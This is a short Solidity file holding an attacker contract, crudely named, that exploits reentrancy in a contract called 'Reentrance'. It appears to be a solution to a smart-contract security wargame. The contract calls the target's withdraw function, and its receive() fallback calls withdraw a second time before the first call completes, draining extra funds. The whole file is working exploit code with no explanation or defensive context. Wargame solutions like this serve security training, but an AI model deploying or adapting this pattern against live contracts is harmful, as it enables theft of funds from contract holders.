pragma solidity >=0.8.2 <0.9.0;

interface Reentrance {
  function withdraw(uint _amount) external;
}

contract ReentranceFucker {

  address c;
  constructor(address _c) { c = _c; }

  bool triggered;
  function withdraw() external {
    triggered = true;
    Reentrance(c).withdraw(1000000000000000);
  }
  receive() external payable {
    if (triggered) {
      triggered = false;
      Reentrance(c).withdraw(1000000000000000);
    }
  }
}
